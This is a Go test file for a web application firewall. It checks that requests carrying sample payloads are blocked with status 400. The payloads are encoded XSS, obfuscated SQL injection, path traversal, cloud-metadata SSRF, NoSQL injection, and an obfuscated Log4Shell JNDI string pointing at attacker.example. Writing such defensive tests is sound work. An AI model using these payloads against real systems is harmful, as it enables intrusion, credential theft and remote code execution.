package falsepositivetests

import (
	"net/http"
	"testing"
)

func TestMaliciousRequestsAreBlocked(t *testing.T) {
	handler := newProtectedHandler(t)

	tests := []requestCase{
		{
			name:   "encoded cross-site scripting",
			method: http.MethodGet,
			target: "http://app.example/search?q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B",
		},
		{
			name:   "comment-obfuscated SQL injection",
			method: http.MethodGet,
			target: "http://app.example/items?id=1+UN/**/ION+SEL/**/ECT+password+FROM+users",
		},
		{
			name:   "path traversal",
			method: http.MethodGet,
			target: "http://app.example/files/../config.php",
		},
		{
			name:        "cloud metadata SSRF",
			method:      http.MethodPost,
			target:      "http://app.example/fetch",
			body:        `{"url":"http://169.254.169.254/latest/meta-data/"}`,
			contentType: "application/json",
		},
		{
			name:   "JNDI lookup in user agent",
			method: http.MethodGet,
			target: "http://app.example/",
			headers: map[string]string{
				"User-Agent": "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/a}",
			},
		},
		{
			name:        "NoSQL operator injection",
			method:      http.MethodPost,
			target:      "http://app.example/users",
			body:        `{"role":{"$ne":"user"},"$where":"this.password.length > 0"}`,
			contentType: "application/json",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			response := executeRequest(t, handler, test)
			if response.Code != http.StatusBadRequest {
				t.Fatalf("expected status 400, got %d; body=%q", response.Code, response.Body.String())
			}
			if action := response.Header().Get("X-DoBotShield-Action"); action != "Blocked-WAF" {
				t.Fatalf("expected Blocked-WAF action, got %q", action)
			}
		})
	}
}
